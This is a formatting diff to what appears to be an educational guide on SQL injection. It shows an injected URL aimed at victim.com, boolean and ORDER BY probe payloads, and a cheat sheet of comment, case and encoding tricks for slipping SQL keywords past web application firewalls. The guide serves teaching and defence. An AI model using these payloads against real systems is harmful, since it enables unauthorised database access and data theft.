@@ -390,9 +390,9 @@ http://victim.com/main/news/id/1%0b||%0blpad(first_name,7,1).html
 ```sql
 -- Input must be numeric
 -- Inject numeric logic:
-id=1 AND 1=1    -- True
-id=1 AND 1=2    -- False
-id=1 ORDER BY 1 -- Error if >1 column
+id=1 AND 1=1      -- True
+id=1 AND 1=2      -- False
+id=1 ORDER BY 1   -- Error if >1 column
 ```
 
 ## WAF Rule Examples (For Defenders)
@@ -492,17 +492,17 @@ end
 
 ## Bypass Cheat Sheet
 
-| Blocked  | Bypass Options                             |
-| -------- | ------------------------------------------ | --- | --- |
-| `UNION`  | `UNI/**/ON`, `UnIoN`, `/*!50000UNION*/`, ` |     | `   |
-| `SELECT` | `SEL/**/ECT`, `SeLeCt`, `/*!50000SELECT*/` |
-| `OR`     | `\|\|`, `\|`, `oR`, `O/**/R`               |
-| `AND`    | `&&`, `&`, `AnD`, `A/**/ND`                |
-| `FROM`   | `FR/**/OM`, `fRoM`, `/*!50000FROM*/`       |
-| `WHERE`  | `W/**/HERE`, `WhErE`                       |
-| Space    | `/**/`, `%0b`, `%0a`, `%0c`, `%0d`, `+`    |
-| `=`      | `LIKE`, `IN`, `BETWEEN`, `<=>` (MySQL)     |
-| `'`      | `"`, `\``, `CHAR(39)`, hex-encoded         |
+| Blocked  | Bypass Options                                  |
+| -------- | ----------------------------------------------- |
+| `UNION`  | `UNI/**/ON`, `UnIoN`, `/*!50000UNION*/`, `\|\|` |
+| `SELECT` | `SEL/**/ECT`, `SeLeCt`, `/*!50000SELECT*/`      |
+| `OR`     | `\|\|`, `\|`, `oR`, `O/**/R`                    |
+| `AND`    | `&&`, `&`, `AnD`, `A/**/ND`                     |
+| `FROM`   | `FR/**/OM`, `fRoM`, `/*!50000FROM*/`            |
+| `WHERE`  | `W/**/HERE`, `WhErE`                            |
+| Space    | `/**/`, `%0b`, `%0a`, `%0c`, `%0d`, `+`         |
+| `=`      | `LIKE`, `IN`, `BETWEEN`, `<=>` (MySQL)          |
+| `'`      | `"`, `\``, `CHAR(39)`, hex-encoded              |
 
 ## Practice Exercises
 
